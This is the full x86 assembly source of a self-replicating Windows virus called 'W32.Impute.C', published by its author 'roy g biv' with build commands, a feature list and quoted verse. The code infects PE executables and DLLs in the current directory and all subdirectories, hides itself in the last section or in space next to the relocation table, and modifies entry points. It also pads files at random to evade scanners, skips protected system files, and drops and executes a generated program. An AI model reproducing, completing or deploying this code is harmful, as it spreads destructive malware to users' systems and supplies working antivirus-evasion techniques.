comment ;)
W32.Impute.C by roy g biv

some of its features:
- parasitic resident (own process) infector of PE exe and dll (but not looking at suffix)
- infects files in current directory and all subdirectories
- directory traversal is linked-list instead of recursive to reduce stack size
- reloc section inserter/last section appender
- weird EPO (entry point is altered but no replication happens there)
- uses CRCs instead of API names
- uses SEH for common code exit
- no infect files with data outside of image (eg self-extractors)
- no infect files protected by SFC
- infected files are padded by random amounts to confuse tail scanners
- correct file checksum without using imagehlp.dll :) 100% correct algorithm

yes, just a W32.Relock remake that infects in a slightly different way

ASLR-enabled version, retnn style
---

  optimisation tip: Windows appends ".dll" automatically, so this works:
        push "cfs"
        push esp
        call LoadLibraryA
---

to build this thing:
tasm
----
tasm32 /ml /m3 impute
tlink32 /B:400000 /x impute,,,import32

Virus runs from data section, so no need to alter section attributes
---

I'm alone here
With emptiness eagles and snow
Unfriendliness chilling my body
And taunting with pictures of home
(Deep Purple)

(;

.386
.model  flat

extern  MessageBoxA:proc
extern  ExitProcess:proc

.data
include impute.inc

dropper         label   near
        push    ebx
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, 1
        mov     ebx, offset sfcnames
        mov     edi, offset sfccrcbegin
        call    create_crcs
        mov     edx, dllcrc_count
        mov     ebx, offset dllnames
        mov     edi, offset dllcrcbegin
        call    create_crcs
        pop     ebx
        jmp     impute_execode
import_size     equ ((offset impute_codeend - offset impute_inf) * 4) + 4
export_size     equ 100h * 4

;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;main virus body.  everything happens in here
;-----------------------------------------------------------------------------

impute_inf      proc    near
        db      offset import_loop - (offset import_list + 1)
        xor     eax, eax
        push    dword ptr fs:[eax]
        mov     dword ptr fs:[eax], esp
        enter   (size findlist - 5) and -4, 0   ;Windows enables alignment check exception
                                                ;so some APIs fail if buffer is not dword aligned
                                                ;-5 to align at 2 dwords earlier
                                                ;because EBP saved automatically
                                                ;and other register saved next
        push    eax                             ;zero findprev in findlist
        mov     eax, dword ptr [ebx + pebLdr]   ;ebx = fs:[30h] at start time
        mov     esi, dword ptr [eax + ldrInLoadOrderModuleList]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     eax, dword ptr [eax + mlDllBase]
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near
        dd      (krncrc_count + 1) dup (0)

;-----------------------------------------------------------------------------
;get SFC support
;-----------------------------------------------------------------------------

        call    load_sfc
        db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)
        db      "IMPute - roy g biv"            ;imported code

load_sfc        label   near
        call    dword ptr [esp + krncrcstk.kLoadLibraryA]
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

sfccrcbegin     label   near
        dd      0, 0

        mov     ebp, esp
        lea     esi, dword ptr [ebp + size krncrcstk]

;-----------------------------------------------------------------------------
;non-recursive directory traverser
;-----------------------------------------------------------------------------

scan_dir        proc    near                    ;ebp -> platform APIs, esi -> findlist
        push    '*'                             ;Unicode findmask
        mov     eax, esp
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        push    eax
        call    dword ptr [ebp + krncrcstk.kFindFirstFileW]
        pop     ecx
        mov     dword ptr [esi + findlist.findhand], eax
        inc     eax
        je      find_prev

        ;you must always step forward from where you stand

test_dirfile    label   near
        mov     eax, dword ptr [ebx + WIN32_FIND_DATA.dwFileAttributes]
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        je      test_file
        cmp     byte ptr [edi], '.'             ;ignore . and .. (but also .* directories)
        je      find_next

;-----------------------------------------------------------------------------
;enter subdirectory, and allocate another list node
;-----------------------------------------------------------------------------

        push    edi
        call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
        xchg    ecx, eax
        jecxz   find_next
        push    size findlist
        push    GMEM_FIXED
        call    dword ptr [esp + krncrcstk.kGlobalAlloc + 8]
        xchg    ecx, eax
        jecxz   step_updir
        xchg    esi, ecx
        mov     dword ptr [esi + findlist.findprev], ecx
        jmp     scan_dir

find_next       label   near
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        mov     edi, dword ptr [esi + findlist.findhand]
        push    edi
        call    dword ptr [ebp + krncrcstk.kFindNextFileW]
        test    eax, eax
        jne     test_dirfile

;-----------------------------------------------------------------------------
;close find, and free list node if not list head
;-----------------------------------------------------------------------------

        mov     ebx, esp
        push    edi
        call    dword ptr [ebx + krncrcstk.kFindClose]

find_prev       label   near
        mov     ecx, dword ptr [esi + findlist.findprev]
        jecxz   impute_exit
        push    esi
        mov     esi, ecx
        call    dword ptr [ebx + krncrcstk.kGlobalFree]

step_updir      label   near

;-----------------------------------------------------------------------------
;the ANSI string ".." can be used, even on Unicode platforms
;-----------------------------------------------------------------------------

        push    '..'
        org     $ - 1                           ;select top 8 bits of push
impute_exit     label   near
        int     3                               ;game over

        push    esp
        call    dword ptr [ebx + krncrcstk.kSetCurrentDirectoryA]
        pop     eax
        jmp     find_next

test_file       label   near

;-----------------------------------------------------------------------------
;get full path
;-----------------------------------------------------------------------------

        push    eax                             ;save original file attributes for close
        mov     eax, ebp
        enter   MAX_PATH * 2, 0
        mov     ecx, esp
        push    eax
        push    esp
        push    ecx
        push    MAX_PATH
        push    edi
        call    dword ptr [eax + krncrcstk.kGetFullPathNameW]
        xchg    edi, eax
        pop     eax
        xor     ebx, ebx

;-----------------------------------------------------------------------------
;don't touch protected files
;-----------------------------------------------------------------------------

        push    esp
        push    ebx
        call    dword ptr [ebp + 8 + krncrcstk.kSfcIsFileProtected]
        leave
        test    eax, eax
        jne     restore_attr
        call    set_fileattr
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    FILE_READ_DATA or FILE_WRITE_DATA
        push    edi
        call    dword ptr [ebp + krncrcstk.kCreateFileW]
        xchg    ebx, eax
        call    test_infect
        db      81h                             ;mask CALL
        call    infect_file                     ;Super Nashwan power ;)

delta_label     label   near
        lea     eax, dword ptr [esi + findlist.finddata.ftLastWriteTime]
        push    eax
        sub     eax, 8
        push    eax
        push    0
        push    ebx
        call    dword ptr [esp + 4 + krncrcstk.kSetFileTime + 10h]
        push    ebx
        call    dword ptr [esp + 4 + krncrcstk.kCloseHandle + 4]

restore_attr    label   near
        pop     ebx                             ;restore original file attributes
        call    set_fileattr
        jmp     find_next
scan_dir        endp

init_kernel32   label   near
        mov     eax, dword ptr [ebx + pebLdr]   ;ebx = fs:[30h] at start time
        mov     esi, dword ptr [eax + ldrInLoadOrderModuleList]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     eax, dword ptr [eax + mlDllBase]

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

parse_exports   label   near
        pop     edi
        xchg    ebx, eax
        mov     esi, dword ptr [ebx + mzhdr.mzlfanew]
        mov     esi, dword ptr [ebx + esi + pehdr.peexport.dirrva]
        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        lea     ecx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Ordinal Table RVA
        lea     ebp, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        scas    dword ptr [edi]
        jmp     edi

;-----------------------------------------------------------------------------
;look for MZ and PE file signatures
;-----------------------------------------------------------------------------

is_pehdr        proc    near                    ;edi -> map view
        cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
        jne     pehdr_ret
        mov     esi, dword ptr [edi + mzhdr.mzlfanew]
        add     esi, edi
        lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
        add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX

pehdr_ret       label   near
        ret                                     ;if PE file, then eax = 0, esi -> COFF header, Z flag set
is_pehdr        endp

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

set_fileattr    proc    near                    ;ebx = file attributes, esi -> findlist, ebp -> platform APIs
        push    ebx
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        push    edi
        call    dword ptr [ebp + krncrcstk.kSetFileAttributesW]
        ret                                     ;edi -> filename
        db      "22/09/13"                      ;better late than never
set_fileattr    endp

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect     proc    near                    ;esi = find data, edi = map view, ebp -> platform APIs
        call    map_view
        mov     ebp, esi
        call    is_pehdr
        jne     inftest_ret
        lods    dword ptr [esi]
        cmp     ax, IMAGE_FILE_MACHINE_I386
        jne     inftest_ret                     ;only Intel 386+

;-----------------------------------------------------------------------------
;32-bit executable file...
;-----------------------------------------------------------------------------

        test    byte ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate], IMAGE_FILE_EXECUTABLE_IMAGE
        je      inftest_ret
        shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
        lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

        mov     eax, dword ptr [esi + pehdr.pesubsys - pehdr.pecoff.petimedate]
        dec     eax
        dec     eax                             ;sub ax, IMAGE_SUBSYSTEM_WINDOWS_GUI
        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI - 2
        jnbe    inftest_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        mov     ecx, dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pecoff.petimedate]
        inc     ecx
        loop    inftest_ret

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pecoff.petimedate]
        add     eax, edx
        mov     ebx, dword ptr [esi + pehdr.pefilealign - pehdr.pecoff.petimedate]
        mov     edx, dword ptr [esi + pehdr.peimagebase - pehdr.pecoff.petimedate]
        lea     esi, dword ptr [esi + eax - pehdr.pecoff.petimedate + pehdr.pemagic - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        add     eax, dword ptr [esi]
        cmp     dword ptr [ebp + findlist.finddata.dwFileSizeLow], eax
        jne     inftest_ret                     ;file contains appended data
        add     dword ptr [ebp + findlist.finddata.dwFileSizeLow], ebx
        inc     dword ptr [esp + mapsehstk.mapsehinfret]
                                                ;skip call mask

inftest_ret     label   near
        int     3

;-----------------------------------------------------------------------------
;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
;-----------------------------------------------------------------------------

open_append     proc    near
        call    dword ptr [esp + size mapstack - 4 + krncrcstk.kGetTickCount]
        and     eax, RANDPADMAX - 1
        add     ax, small (offset impute_codeend - offset impute_inf + RANDPADMIN)

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view        proc    near                    ;eax = extra bytes to map, ebx = file handle, esi -> findlist, ebp -> platform APIs
        cdq
        add     eax, dword ptr [esi + findlist.finddata.dwFileSizeLow]
        push    eax
        mov     ecx, esp
        push    eax                             ;MapViewOfFile
        push    edx                             ;MapViewOfFile
        push    edx                             ;MapViewOfFile
        push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
        push    edx
        push    eax
        push    edx
        push    PAGE_READWRITE
        push    edx
        push    ebx
        call    dword ptr [ecx + size mapstack + krncrcstk.kCreateFileMappingA]
                                                ;ANSI map is allowed because of no name
        push    eax
        xchg    edi, eax
        call    dword ptr [esp + size mapstack + krncrcstk.kMapViewOfFile + 14h]
        pop     ecx
        xchg    edi, eax                        ;should succeed even if file cannot be opened
        pushad
        call    unmap_seh
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad                                   ;SEH destroys all registers
        push    eax
        push    edi
        call    dword ptr [esp + size mapstack + krncrcstk.kUnmapViewOfFile + 4]
        call    dword ptr [esp + size mapstack + krncrcstk.kCloseHandle]
        pop     eax
        ret

unmap_seh       proc    near
        cdq
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        jmp     dword ptr [esp + mapsehstk.mapsehsehret]
unmap_seh       endp
map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
open_append     endp

;-----------------------------------------------------------------------------
;infect file in two parts
;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
;               bytes) to confuse scanners that look at end of file (also
;               infection marker)
;               if reloc table is not in last section (taken from relocation
;               field in PE header, not section name), then append to last
;               section.  otherwise, move relocs down and insert code into
;               space (to confuse people looking at end of file.  they will
;               see only relocation data and garbage or many zeroes)
;               entry point is altered to point to some code.  very simple
;               however, that code just drops exe and returns
;-----------------------------------------------------------------------------

infect_file     label   near                    ;esi -> findlist, edi = map view
        call    open_append
        push    ecx
        push    edi
        mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
        lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
        xor     ecx, ecx
        imul    cx, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum], size pesect
        add     cx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
        lea     esi, dword ptr [ebx + ecx + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        mov     cx, offset impute_codeend - offset impute_inf
        mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
        push    eax
        add     eax, ecx
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx                        ;file align last section
        mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax

;-----------------------------------------------------------------------------
;raw size is file aligned.  virtual size is not required to be section aligned
;so if old virtual size is larger than new raw size, then size of image does
;not need to be updated, else virtual size must be large enough to cover the
;new code, and size of image is section aligned
;-----------------------------------------------------------------------------

        mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
        cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        jnb     test_reloff
        mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        add     eax, ebp
        mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx
        mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax

;-----------------------------------------------------------------------------
;if relocation table is not in last section, then append to last section
;otherwise, move relocations down and insert code into space
;-----------------------------------------------------------------------------

test_reloff     label   near
        test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
        jne     copy_code
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
        jb      copy_code
        mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
        add     eax, ebp
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
        jnb     copy_code
        add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
        pop     eax
        push    esi
        add     edi, dword ptr [esi]
        lea     esi, dword ptr [edi + eax - 1]
        lea     edi, dword ptr [esi + ecx]
        xchg    ecx, eax
        std
        rep     movs byte ptr [edi], byte ptr [esi]
        cld
        pop     esi
        pop     edi
        push    edi
        push    ecx
        xchg    ecx, eax

copy_code       label   near
        pop     edx
        add     ebp, edx
        add     edx, dword ptr [esi]
        add     edi, edx

;-----------------------------------------------------------------------------
;we need the writable bit for RNG
;-----------------------------------------------------------------------------

        or      byte ptr [esi + pesect.sectflags - pesect.sectrawaddr + 3], (IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE) shr 18h
        mov     esi, offset impute_inf - offset delta_label
        add     esi, dword ptr [esp + infectstk.infseh.mapsehsehret]
                                                ;delta offset
        rep     movs byte ptr [edi], byte ptr [esi]

;-----------------------------------------------------------------------------
;alter entry point
;-----------------------------------------------------------------------------

        add     ebp, offset impute_execode - offset impute_inf
        xchg    dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum], ebp
        sub     ebp, dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum]
        sub     ebp, 5
        mov     dword ptr [edi + offset host_patch - offset impute_codeend + 3], ebp
        pop     edi

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xchg    dword ptr [ebx], ecx
        jecxz   infect_ret
        cdq
        pop     ecx
        push    ecx
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum   label   near
        adc     dx, word ptr [edi]
        inc     edi
        inc     edi
        loop    calc_checksum
        pop     dword ptr [ebx]
        adc     dword ptr [ebx], edx            ;avoid common bug.  ADC not ADD

infect_ret      label   near
        int     3                               ;common exit using SEH
        db      "*4U2NV*"                       ;that is, unless you're reading this
test_infect     endp

;-----------------------------------------------------------------------------
;Mersenne Twister RNG MT19937 (c) 1997 Makoto Matsumoto and Takuji Nishimura
;period is ((2^19937)-1) with 623-dimensionally equidistributed sequence
;asm port and size optimise by rgb in 2002
;-----------------------------------------------------------------------------

randinit        proc    near                    ;eax = seed, ecx = 0, edi -> RNG cache
        pushad
        push    edi
        or      eax, 1
        mov     ecx, statelen

init_loop       label   near
        stos    dword ptr [edi]
        mov     edx, 69069
        mul     edx                             ;Knuth label   near x_new = x_old * 69069
        loop    init_loop
        inc     ecx                             ;force reload
        call    initdelta

initdelta       label   near
        pop     edi
        add     edi, offset randvars - offset initdelta
        xchg    ecx, eax
        stos    dword ptr [edi]
        pop     eax
        stos    dword ptr [edi]
        stos    dword ptr [edi]
        popad
        ret
randinit        endp

random          proc    near
        pushad
        call    randelta

randvars        label   near
        db      'rgb!'                          ;numbers left
        db      'rgb!'                          ;next pointer
        db      'rgb!'                          ;state pointer

randelta        label   near
        pop     esi
        push    esi
        lods    dword ptr [esi]
        xchg    ecx, eax
        lods    dword ptr [esi]
        xchg    esi, eax
        loop    random_ret
        mov     cx, statelen - period
        mov     esi, dword ptr [eax]
        lea     ebx, dword ptr [esi + (period * 4)]
        mov     edi, esi
        push    esi
        lods    dword ptr [esi]
        xchg    edx, eax
        call    twist
        pop     ebx
        mov     cx, period - 1
        push    ecx
        push    ebx
        call    twist
        pop     esi
        push    esi
        inc     ecx
        call    twist
        xchg    edx, eax
        pop     esi
        pop     ecx
        inc     ecx

random_ret      label   near
        lods    dword ptr [esi]
        mov     edx, eax
        shr     eax, tshiftU
        xor     eax, edx
        mov     edx, eax
        shl     eax, tshiftS
        and     eax, tmaskB
        xor     eax, edx
        mov     edx, eax
        shl     eax, tshiftT
        and     eax, tmaskC
        xor     eax, edx
        mov     edx, eax
        shr     eax, tshiftL
        xor     eax, edx
        pop     edi
        mov     dword ptr [esp + 1ch], eax      ;eax in pushad
        xchg    ecx, eax
        stos    dword ptr [edi]
        xchg    esi, eax
        stos    dword ptr [edi]
        popad
        ret
random          endp

twist           proc    near
        lods    dword ptr [esi]
        push    eax
        add     eax, eax                        ;remove highest bit
        add     edx, edx                        ;test highest bit
        rcr     eax, 2                          ;merge bits and test lowest bit
        jnb     twist_skip                      ;remove branch but larger using label   near
        xor     eax, matrixA                    ;sbb edx, edx+and edx, matrixA+xor eax, edx

twist_skip      label   near
        xor     eax, dword ptr [ebx]
        add     ebx, 4
        stos    dword ptr [edi]
        pop     edx
        loop    twist
        ret
twist           endp

        ;When last comes to last,
        ;  I have little power:
        ;  I am merely an urn.
        ;I hold the bone-sap of myself,
        ;  And watch the marrow burn.
        ;
        ;When last comes to last,
        ;  I have little strength:
        ;  I am only a tool.
        ;I work its work; and in its hands
        ;  I am the fool.
        ;
        ;When last comes to last,
        ;  I have little life.
        ;  I am simply a deed:
        ;an action done while courage holds:
        ;  A seed.
        ;(Stephen Donaldson)

impute_execode  proc    near
        call    $+5
host_patch      label   near
        add     dword ptr [esp], offset do_message - offset host_patch
                                                ;replaced dynamically
        pushad
        mov     ebx, dword ptr fs:[30h]
        call    init_kernel32

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

dllcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (dllcrc_count + 1) dup (0)
        mov     ebx, esp
        call    dword ptr [ebx + dllcrcstk.dGetTickCount]
        mov     ebp, "r."
        enter   (statelen + 1) shl 2, 0         ;RNG cache
        mov     edi, esp
        call    randinit
        mov     esi, exesize + import_size + export_size + offset import_list - offset impute_imp
        push    esi
        push    GMEM_ZEROINIT
        call    dword ptr [ebx + dllcrcstk.dGlobalAlloc]
        cdq
        push    edx                             ;WinExec
        push    ebp                             ;WinExec
        push    eax                             ;GlobalFree
        push    edx                             ;WriteFile
        push    esp                             ;WriteFile
        push    esi                             ;WriteFile
        push    eax                             ;WriteFile
        push    edx                             ;CreateFile
        push    edx                             ;CreateFile
        push    CREATE_ALWAYS                   ;CreateFile
        push    edx                             ;CreateFile
        push    edx                             ;CreateFile
        push    FILE_WRITE_DATA                 ;CreateFile
        push    ebp                             ;CreateFile
        call    skip_exe
        dd      10101011000101110110111111101110b
;               mz  0ammz  02mmmz  0dmmmmmmz  0e
        db      'M', 'Z', 'P', 'E', 4ch, 1, 1, 40h, 0, 2, 0, 0bh, 1
        dd      11001101001011000101000111010101b
;               mmz  06mz  05mz  02mz  03mz  0am
        db      exesize, SectAlign shr 8, 0ch, 40h, SectAlign shr 8, 2, 4
        dd      01000100010100111111001101000101b
;               z  08mz  02mz  07mmmz  06mz  02m
        db      (((SectAlign*2 - 1) + exesize + (import_size + export_size + offset import_list - offset impute_imp)) and -SectAlign) shr 8, 94h, 2, 0, 40h, SectAlign shr 8, (import_size + export_size + (exesize - 94h) + offset import_list - offset impute_imp) and 0ffh
        dd      10001010011110001111000101000101b
;               mz  02mz  07mz  03mmz  02mmz  05
        db      (import_size + export_size + (exesize - 94h) + offset import_list - offset impute_imp) shr 8, 94h, 2, 94h, SectAlign shr 8, 20h, 0e0h
        dd      11010101100110110001011000111000b
;               mmz  0ammz  06mmz  02mmz  03m
        db      94h, SectAlign shr 8, '.', 'r', 98h, SectAlign shr 8, (exesize + offset import_list - offset impute_imp) and 0ffh, SectAlign shr 8, 2
        dd      00110110010100000000000000000000b
;               z  06mmz  05
        db      (exesize + import_size + offset import_list - offset impute_imp) and 0ffh, (SectAlign + exesize + import_size + offset import_list - offset impute_imp) shr 8
        dd      0

impute_imp      label   near
        call    $+5                             ;dword must at $+1 must be zero
        pop     esi
        add     esi, -5 + offset import_list - offset impute_imp
        mov     edi, esi

import_loop     label   near
        mov     eax, esp
        call    esi
        sub     esp, eax
        xchg    esp, eax
        stos    byte ptr [edi]
        lods    dword ptr [esi]
        cmp     byte ptr [esi], bl
        db      75h
import_list     label   near

exesize equ     0b7h
;RLE-based compressed MZ header, PE header, section table

;decompressed data follow
;       db      'M', 'Z'                ;00
;       db      0ah dup (0)             ;02    align 12
;       db      'P', 'E', 0, 0          ;0c 00 signature
;       dw      14ch                    ;10 04 machine
;       dw      1                       ;12 06 number of sections
;       dd      0                       ;14 08 date/time stamp
;       dd      0                       ;18 0c pointer to symbol table
;       dd      0                       ;1c 10 number of symbols
;       dw      offset section_table - 18h
;                                       ;20 14 size of optional header
;       dw      2                       ;22 16 characteristics
;       dw      10bh                    ;24 18 magic
;       db      0                       ;26 1a major linker
;       db      0                       ;27 1b minor linker
;       dd      0                       ;28 1c size of code
;       dd      0                       ;2c 20 size of init data
;       dd      0                       ;30 24 size of uninit data
;       dd      SectAlign               ;34 28 entry point
;       dd      0                       ;38 2c base of code
;       dd      0ch                     ;3c 30 base of data (overload for lfanew)
;       dd      400000h                 ;40 34 image base
;       dd      SectAlign               ;44 38 section align
;       dd      200h                    ;48 3c file align
;       dw      0                       ;4c 40 major os
;       dw      0                       ;4e 42 minor os
;       dw      0                       ;50 44 major image
;       dw      0                       ;52 46 minor image
;       dw      4                       ;54 48 major subsys
;       dw      0                       ;56 4a minor subsys
;       dd      0                       ;58 4c reserved
;       dd      (aligned size of code)  ;5c 50 size of image
;       dd      offset import_table     ;60 54 size of headers
;section_table:
;       dd      0                       ;64 58 checksum (overload for section name)
;       dw      2                       ;68 5c subsystem (overload for section name)
;       dw      40h                     ;6a 5e dll characteristics (overload for section name)
;       dd      0                       ;6c 60 size of stack reserve (overload for virtual size)
;       dd      SectAlign               ;70 64 size of stack commit (overload for virtual address)
;       dd      offset impute_codeend - offset import_table
;                                       ;74 68 size of heap reserve (overload for file size)
;       dd      offset import_table     ;78 6c size of heap commit (overload for file offset)
;       dd      0                       ;7c 70 loader flags (overload for pointer to relocs)
;       dd      2                       ;80 74 number of rva and sizes (overload for pointer to line numbers)
;export_dir:
;       dd      SectAlign + offset export_table
;                                       ;84 78 export (overload for reloc table and line numbers)
;       dd      0e0000020h              ;88 7c export (overload for section characteristics)
;       dd      SectAlign + offset import_table
;                                       ;8c 80 import
;       dd      0                       ;90 84 import
;export_table:
;import_table:
;       dd      0                       ;94 88 resource (overload for export flags and import lookup table)
;import_name:
;       db      ".r", 0, 0              ;98 8c resource (overload for export and import timedate stamp)
;       dd      0                       ;9c 90 exception (overload for export version and import forwarder chain)
;       dd      SectAlign + offset import_name
;                                       ;a0 94 exception (overload for export and import name rva)
;       dd      SectAlign + offset import_list
;                                       ;a4 98 certificate (overload for export ordinal base and import address table)
;       dd      200h                    ;a8 9c certificate (overload for export address table entries)
;       dd      0                       ;ac a0 base reloc (overload for export number of name pointers)
;       dd      SectAlign + offset export_address
;                                       ;b0 a4 base reloc (overload for export address table rva)
;       db      3 dup (0)               ;b4 a8 debug (overload for export name pointer rva)
;                                       ;b7 (overload for call, and following dword must be zero)

skip_exe        label   near
        pop     esi
        xchg    edi, eax
        xor     ecx, ecx
        cdq

;-----------------------------------------------------------------------------
;decompress dll MZ header, PE header, section table, relocation table
;-----------------------------------------------------------------------------

        lods    dword ptr [esi]

copy_bytes      label   near
        movs    byte ptr [edi], byte ptr [esi]

test_bits       label   near
        add     eax, eax
        jb      copy_bytes
        shld    ecx, eax, 4
        shl     eax, 4
        xchg    edx, eax
        rep     stos byte ptr [edi]
        xchg    edx, eax
        jne     test_bits
        lods    dword ptr [esi]
        test    eax, eax
        jne     test_bits
        mov     cl, offset import_list - offset impute_imp
        rep     movs byte ptr [edi], byte ptr [esi]
        push    ebx
        enter   100h, 0
        push    esp
        xchg    dword ptr [esp], edi
        xor     eax, eax
        mov     cl, 40h
        mov     ebx, edi
        rep     stos dword ptr [edi]
        pop     edi
        mov     edx, 0f00000c2h                 ;top 4 bits must be non-zero to avoid forwarding detection

init_expmov     label   near
        call    random
        movzx   eax, al
        cmp     byte ptr [eax * 4 + edi + import_size], ah
        jne     init_expmov
        mov     dword ptr [eax * 4 + edi + import_size], edx
        mov     byte ptr [ebx + ecx], al
        inc     ecx
        inc     dh
        jne     init_expmov
        mov     cx, offset impute_codeend - offset impute_inf
        mov     edx, edi
        sub     esi, offset import_list - offset impute_inf

init_code       label   near
        xor     eax, eax
        lods    byte ptr [esi]
        xlat    byte ptr [ebx]
        add     eax, 80000000h + SectAlign + exesize + offset import_list - offset impute_imp
        stos    dword ptr [edi]
        loop    init_code
        leave
        pop     ebx
        call    dword ptr [ebx + dllcrcstk.dCreateFileA]
        push    eax
        xchg    ebp, eax
        call    dword ptr [ebx + dllcrcstk.dWriteFile]
        push    ebp
        call    dword ptr [ebx + dllcrcstk.dCloseHandle]
        call    dword ptr [ebx + dllcrcstk.dGlobalFree]
        call    dword ptr [ebx + dllcrcstk.dWinExec]
        lea     esp, dword ptr [ebx + size dllcrcstk]
        popad
        ret

impute_codeend  label   near
impute_execode  endp
impute_inf      endp

create_crcs     proc    near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
